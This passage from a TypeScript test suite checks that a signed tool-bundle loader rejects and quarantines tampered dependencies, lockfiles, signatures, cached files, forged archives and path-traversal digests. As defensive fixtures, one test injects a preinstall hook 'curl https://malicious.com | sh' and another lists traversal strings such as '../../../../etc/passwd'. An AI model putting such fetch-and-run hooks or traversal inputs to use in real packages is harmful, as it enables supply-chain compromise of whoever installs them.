          "node_modules/lodash": { version: "4.17.21", integrity: "sha512-tampered-xyz" },
        },
      };

      const built = await buildToolBundle({
        manifest: validManifest,
        files: [
          { path: "src/index.ts", content: sourceCode },
          { path: "package.json", content: JSON.stringify(validPkg) },
          { path: "package-lock.json", content: JSON.stringify(driftedLock) },
        ],
        qualification: qualificationBundle,
        signOptions: {
          keyId: prodKeyPair.keyId,
          privateKeyPem: prodKeyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });

      await expect(loader.loadBundle(built.archiveBuffer)).rejects.toThrow(
        /Dependency and package-lock graph digest mismatch/,
      );
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("rejects package.json metadata/scripts drift against approved qualification", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-pkg-meta-drift-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");
      const prodKeyPair = generateBundleKeyPair("ed25519", "prod-signer-meta-01");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: prodKeyPair.keyId,
          algorithm: "ed25519",
          publicKeyPem: prodKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore, development: false });

      const sourceCode = "export const ok = 1;";
      const approvedPkg = {
        name: "test-meta-pkg",
        version: "1.0.0",
        type: "module",
        scripts: { test: "vitest" },
        dependencies: { lodash: "^4.17.21" },
      };
      const approvedPkgDigest = computeSha256(canonicalJson(approvedPkg));

      const qualificationBundle = createTestQualificationBundle(
        sourceCode,
        prodKeyPair,
        undefined,
        {
          depDigest: approvedPkgDigest,
          dependencies: approvedPkg.dependencies,
        },
      );

      // Tampered scripts (e.g. preinstall hook injected)
      const tamperedPkg = {
        ...approvedPkg,
        scripts: { test: "vitest", preinstall: "curl https://malicious.com | sh" },
      };

      const built = await buildToolBundle({
        manifest: validManifest,
        files: [
          { path: "src/index.ts", content: sourceCode },
          { path: "package.json", content: JSON.stringify(tamperedPkg) },
        ],
        qualification: qualificationBundle,
        signOptions: {
          keyId: prodKeyPair.keyId,
          privateKeyPem: prodKeyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });

      await expect(loader.loadBundle(built.archiveBuffer)).rejects.toThrow(
        /Dependency digest mismatch/,
      );
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("rejects unsigned directory in production mode with MISSING_SIGNATURE", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-unsigned-dir-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");
      const prodKeyPair = generateBundleKeyPair("ed25519", "prod-signer-dir-01");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: prodKeyPair.keyId,
          algorithm: "ed25519",
          publicKeyPem: prodKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore, development: false });

      const workspaceDir = path.join(tempRoot, "workspace");
      fs.mkdirSync(path.join(workspaceDir, "src"), { recursive: true });
      fs.writeFileSync(path.join(workspaceDir, "manifest.json"), JSON.stringify(validManifest));
      fs.writeFileSync(path.join(workspaceDir, "src/index.ts"), "export const ok = 1;");

      const sourceCode = "export const ok = 1;";
      const qualificationBundle = createTestQualificationBundle(sourceCode, prodKeyPair);
      fs.writeFileSync(
        path.join(workspaceDir, "qualification.json"),
        JSON.stringify(qualificationBundle),
      );

      // Unsigned directory in production mode must be rejected with MISSING_SIGNATURE
      await expect(loader.loadBundle(workspaceDir)).rejects.toThrowError(BundleSignatureError);

      const quarantined = await quarantine.listQuarantined();
      expect(quarantined.length).toBeGreaterThanOrEqual(1);
      expect(quarantined[0]?.reason).toBe("signature_mismatch");
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("rejects signed directory when helper file is altered on disk (RUNTIME-SIGNATURE-BINDING-001)", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-dir-helper-alter-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");
      const prodKeyPair = generateBundleKeyPair("ed25519", "prod-signer-helper-01");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: prodKeyPair.keyId,
          algorithm: "ed25519",
          publicKeyPem: prodKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore, development: false });

      const sourceCode = "export const main = 1;";
      const qualificationBundle = createTestQualificationBundle(sourceCode, prodKeyPair);

      const built = await buildToolBundle({
        manifest: validManifest,
        files: [
          { path: "src/index.ts", content: sourceCode },
          { path: "src/helper.ts", content: "export const helper = 'clean';" },
        ],
        qualification: qualificationBundle,
        signOptions: {
          keyId: prodKeyPair.keyId,
          privateKeyPem: prodKeyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });

      // Extract built bundle into a workspace directory
      const workspaceDir = path.join(tempRoot, "workspace");
      fs.mkdirSync(path.join(workspaceDir, "src"), { recursive: true });
      const entries = parseTarArchive(built.archiveBuffer);
      for (const entry of entries) {
        const fullPath = path.join(workspaceDir, entry.path);
        fs.mkdirSync(path.dirname(fullPath), { recursive: true });
        fs.writeFileSync(fullPath, entry.content);
      }

      // Alter helper.ts directly on disk
      fs.writeFileSync(
        path.join(workspaceDir, "src/helper.ts"),
        "export const helper = 'tampered-evil';",
      );

      // Loading directory must detect helper file digest mismatch
      await expect(loader.loadBundle(workspaceDir)).rejects.toThrow();

      const quarantined = await quarantine.listQuarantined();
      expect(quarantined.length).toBeGreaterThanOrEqual(1);
      expect(quarantined[0]?.reason).toBe("signature_mismatch");
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("invalidates cache and quarantines when cached helper file is tampered after initial load", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-cache-helper-tamper-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");
      const prodKeyPair = generateBundleKeyPair("ed25519", "prod-key-cache-helper-01");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: prodKeyPair.keyId,
          algorithm: "ed25519",
          publicKeyPem: prodKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore });

      const sourceCode = "export const main = 1;";
      const qualificationBundle = createTestQualificationBundle(sourceCode, prodKeyPair);

      const built = await buildToolBundle({
        manifest: validManifest,
        files: [
          { path: "src/index.ts", content: sourceCode },
          { path: "src/helper.ts", content: "export const helper = 'clean';" },
        ],
        qualification: qualificationBundle,
        signOptions: {
          keyId: prodKeyPair.keyId,
          privateKeyPem: prodKeyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });

      // Initial load: successfully extracted and cached
      const loaded = await loader.loadBundle(built.archiveBuffer);
      expect(loaded.isApproved).toBe(true);

      // Tamper with cached helper file directly on disk
      const cachedHelper = path.join(loaded.artifactDir, "src/helper.ts");
      fs.writeFileSync(cachedHelper, "export const helper = 'tampered-evil';");

      // Next load must detect helper mismatch, invalidate cache, quarantine, and throw
      await expect(loader.loadBundle(built.archiveBuffer)).rejects.toThrow();
      expect(cache.hasArtifact(built.bundleDigest)).toBe(false);

      const quarantined = await quarantine.listQuarantined();
      expect(quarantined.length).toBeGreaterThanOrEqual(1);
      expect(quarantined[0]?.reason).toBe("signature_mismatch");
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("invalidates cache and quarantines when cached package-lock.json is tampered after initial load", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-cache-lock-tamper-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");
      const prodKeyPair = generateBundleKeyPair("ed25519", "prod-key-cache-lock-01");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: prodKeyPair.keyId,
          algorithm: "ed25519",
          publicKeyPem: prodKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore });

      const sourceCode = "export const ok = 1;";
      const validPkg = {
        name: "test-lock-cache",
        version: "1.0.0",
        dependencies: { lodash: "^4.17.21" },
      };
      const validLock = {
        name: "test-lock-cache",
        version: "1.0.0",
        lockfileVersion: 3,
        packages: { "node_modules/lodash": { version: "4.17.21", integrity: "sha512-abc" } },
      };
      const lockGraphDigest = computeSha256(canonicalJson({ package: validPkg, lock: validLock }));

      const qualificationBundle = createTestQualificationBundle(
        sourceCode,
        prodKeyPair,
        undefined,
        {
          depDigest: lockGraphDigest,
          dependencies: validPkg.dependencies,
        },
      );

      const built = await buildToolBundle({
        manifest: validManifest,
        files: [
          { path: "src/index.ts", content: sourceCode },
          { path: "package.json", content: JSON.stringify(validPkg) },
          { path: "package-lock.json", content: JSON.stringify(validLock) },
        ],
        qualification: qualificationBundle,
        signOptions: {
          keyId: prodKeyPair.keyId,
          privateKeyPem: prodKeyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });

      // Initial load: successfully cached
      const loaded = await loader.loadBundle(built.archiveBuffer);
      expect(loaded.isApproved).toBe(true);

      // Tamper with package-lock.json directly in cache
      const cachedLock = path.join(loaded.artifactDir, "package-lock.json");
      fs.writeFileSync(
        cachedLock,
        JSON.stringify({
          name: "test-lock-cache",
          version: "1.0.0",
          lockfileVersion: 3,
          packages: {
            "node_modules/lodash": { version: "4.17.21", integrity: "sha512-tampered-evil" },
          },
        }),
      );

      // Next load must detect lock tampering, invalidate cache, quarantine, and throw
      await expect(loader.loadBundle(built.archiveBuffer)).rejects.toThrow();
      expect(cache.hasArtifact(built.bundleDigest)).toBe(false);

      const quarantined = await quarantine.listQuarantined();
      expect(quarantined.length).toBeGreaterThanOrEqual(1);
      expect(quarantined[0]?.reason).toBe("signature_mismatch");
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("invalidates cache and quarantines when cached signature.json is tampered after initial load", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-cache-sig-tamper-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");
      const prodKeyPair = generateBundleKeyPair("ed25519", "prod-key-cache-sig-01");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: prodKeyPair.keyId,
          algorithm: "ed25519",
          publicKeyPem: prodKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore });

      const sourceCode = "export const ok = 1;";
      const qualificationBundle = createTestQualificationBundle(sourceCode, prodKeyPair);

      const built = await buildToolBundle({
        manifest: validManifest,
        files: [{ path: "src/index.ts", content: sourceCode }],
        qualification: qualificationBundle,
        signOptions: {
          keyId: prodKeyPair.keyId,
          privateKeyPem: prodKeyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });

      // Initial load: successfully cached
      const loaded = await loader.loadBundle(built.archiveBuffer);
      expect(loaded.isApproved).toBe(true);

      // Tamper with signature.json directly in cache
      const cachedSig = path.join(loaded.artifactDir, "signature.json");
      const sigObj = JSON.parse(fs.readFileSync(cachedSig, "utf8"));
      sigObj.signature = "00".repeat(64);
      fs.writeFileSync(cachedSig, JSON.stringify(sigObj));

      // Next load must detect signature tampering, invalidate cache, quarantine, and throw
      await expect(loader.loadBundle(built.archiveBuffer)).rejects.toThrow();
      expect(cache.hasArtifact(built.bundleDigest)).toBe(false);

      const quarantined = await quarantine.listQuarantined();
      expect(quarantined.length).toBeGreaterThanOrEqual(1);
      expect(quarantined[0]?.reason).toBe("signature_mismatch");
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("stages directory loads into loader-owned immutable directory so caller mutation after load does not affect execution path", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-dir-staging-immutability-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");
      const prodKeyPair = generateBundleKeyPair("ed25519", "prod-signer-stage-01");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: prodKeyPair.keyId,
          algorithm: "ed25519",
          publicKeyPem: prodKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore, development: false });

      const sourceCode = "export const secureValue = 'verified-clean';";
      const qualificationBundle = createTestQualificationBundle(sourceCode, prodKeyPair);

      const built = await buildToolBundle({
        manifest: validManifest,
        files: [{ path: "src/index.ts", content: sourceCode }],
        qualification: qualificationBundle,
        signOptions: {
          keyId: prodKeyPair.keyId,
          privateKeyPem: prodKeyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });

      // Extract into caller-owned workspace directory
      const callerWorkspaceDir = path.join(tempRoot, "caller_workspace");
      fs.mkdirSync(path.join(callerWorkspaceDir, "src"), { recursive: true });
      const entries = parseTarArchive(built.archiveBuffer);
      for (const entry of entries) {
        const fullPath = path.join(callerWorkspaceDir, entry.path);
        fs.mkdirSync(path.dirname(fullPath), { recursive: true });
        fs.writeFileSync(fullPath, entry.content);
      }

      // Load directory
      const loaded = await loader.loadBundle(callerWorkspaceDir);
      expect(loaded.isApproved).toBe(true);

      // CRITICAL: returned artifactDir must be loader-owned cache/staging path, NOT callerWorkspaceDir!
      expect(loaded.artifactDir).not.toBe(callerWorkspaceDir);
      expect(loaded.entrypointPath).not.toBe(path.join(callerWorkspaceDir, "src/index.ts"));
      expect(fs.existsSync(loaded.entrypointPath)).toBe(true);

      // Caller mutates original workspace directly after load
      fs.writeFileSync(
        path.join(callerWorkspaceDir, "src/index.ts"),
        "export const secureValue = 'tampered-attacker';",
      );

      // The staged loader-owned entrypoint path MUST remain untouched and pristine!
      const stagedContent = fs.readFileSync(loaded.entrypointPath, "utf8");
      expect(stagedContent).toBe("export const secureValue = 'verified-clean';");
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("rejects forged incoming archive claiming existing cached bundle digest without returning cached artifact (cache-confusion prevention)", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-cache-confusion-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");
      const prodKeyPair = generateBundleKeyPair("ed25519", "prod-signer-confusion-01");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: prodKeyPair.keyId,
          algorithm: "ed25519",
          publicKeyPem: prodKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore, development: false });

      // 1. Build and successfully load benign bundle A
      const sourceCodeA = "export const benign = 'tool-A';";
      const qualificationBundleA = createTestQualificationBundle(sourceCodeA, prodKeyPair);
      const builtA = await buildToolBundle({
        manifest: validManifest,
        files: [{ path: "src/index.ts", content: sourceCodeA }],
        qualification: qualificationBundleA,
        signOptions: {
          keyId: prodKeyPair.keyId,
          privateKeyPem: prodKeyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });

      const loadedA = await loader.loadBundle(builtA.archiveBuffer);
      expect(loadedA.isApproved).toBe(true);
      expect(loadedA.digest).toBe(builtA.bundleDigest);
      expect(cache.hasArtifact(builtA.bundleDigest)).toBe(true);

      // 2. Extract signature.json from bundle A
      const entriesA = parseTarArchive(builtA.archiveBuffer);
      const sigEntryA = entriesA.find((e) => e.path === "signature.json");
      expect(sigEntryA).toBeDefined();

      // 3. Construct forged archive B containing malicious payload but embedding signature.json from A
      const forgedEntries = [
        {
          path: "manifest.json",
          content: Buffer.from(JSON.stringify(validManifest)),
          mode: 0o644,
          executable: false,
        },
        {
          path: "src/index.ts",
          content: Buffer.from("export const evil = 'attack-code-payload';"),
          mode: 0o644,
          executable: false,
        },
        {
          path: "package.json",
          content: Buffer.from(JSON.stringify({ name: "tool", version: "1.0.0" })),
          mode: 0o644,
          executable: false,
        },
        {
          path: "signature.json",
          content: sigEntryA!.content,
          mode: 0o644,
          executable: false,
        },
      ];
      const { archive: forgedArchiveB } = encodeDeterministicTar(forgedEntries);

      // 4. Loading forged archive B MUST reject and NOT return cached tool A!
      await expect(loader.loadBundle(forgedArchiveB)).rejects.toThrow();

      const quarantined = await quarantine.listQuarantined();
      expect(quarantined.length).toBeGreaterThanOrEqual(1);
      expect(quarantined[0]?.reason).toBe("signature_mismatch");
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("rejects malicious digest path traversal / separator injection in quarantine API", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "quarantine-digest-traversal-test-"));
    try {
      const quarantineDir = path.join(tempRoot, "quarantine");
      const quarantine = new QuarantineManager({ quarantineDir });

      const maliciousDigests = [
        "../../../../etc/passwd",
        "/var/run/escape",
        "sha256:../../../../root",
        "..\\..\\windows\\system32",
        "nested/../../traversal",
        "sha256:malicious/digest/escape",
      ];

      for (const badDigest of maliciousDigests) {
        const record = await quarantine.quarantinePayload(
          "malicious payload content",
          "policy_violation",
          { input: "attack" },
          badDigest,
        );

        expect(record).toBeDefined();
        // Quarantine ID must strictly be alphanumeric with underscores
        expect(/^[a-zA-Z0-9_-]+$/.test(record.quarantineId)).toBe(true);
        expect(record.quarantineId).not.toContain("..");
        expect(record.quarantineId).not.toContain("/");
        expect(record.quarantineId).not.toContain("\\");

        // quarantinePath must be strictly contained inside quarantineDir
        const resolvedQuarantineDir = path.resolve(quarantineDir);
        const resolvedTargetPath = path.resolve(record.quarantinePath);
        expect(resolvedTargetPath.startsWith(resolvedQuarantineDir + path.sep)).toBe(true);
        expect(fs.existsSync(record.quarantinePath)).toBe(true);
        expect(fs.existsSync(path.join(record.quarantinePath, "payload.bin"))).toBe(true);
        expect(fs.existsSync(path.join(record.quarantinePath, "record.json"))).toBe(true);

        // getQuarantined must safely retrieve the record
        const fetched = await quarantine.getQuarantined(record.quarantineId);
        expect(fetched?.quarantineId).toBe(record.quarantineId);

        // Attacking getQuarantined with traversal must return null
        expect(await quarantine.getQuarantined("../escape")).toBeNull();
        expect(await quarantine.getQuarantined("../../etc/passwd")).toBeNull();
      }
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("quarantines corrupted cached targets when locked artifact verification fails", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-cache-corrupt-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(cacheDir, "quarantine");
      const quarantine = new QuarantineManager({ quarantineDir });
      const cache = new ArtifactCache({ cacheDir, quarantineManager: quarantine });

      const corruptDigest = "0".repeat(64);
      const corruptDir = cache.getArtifactPath(corruptDigest);
      fs.mkdirSync(corruptDir, { recursive: true });
      fs.writeFileSync(path.join(corruptDir, "corrupted.txt"), "damaged content");

      expect(cache.isArtifactCached(corruptDigest)).toBe(false);

      const entry = {
        toolId: "00000000-0000-4000-8000-000000000001",
        name: "test-tool",
        version: "1.0.0",
        manifestDigest: "a".repeat(64),
        artifactDigest: corruptDigest,
        status: "active" as const,
      };

      const verified = await cache.getVerifiedLockedArtifact(entry);
      expect(verified).toBeNull();
      expect(fs.existsSync(corruptDir)).toBe(false);

      const records = await quarantine.listQuarantined();
      expect(records.length).toBeGreaterThanOrEqual(1);
      expect(records[0]?.reason).toBe("manifest_invalid");
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });
});
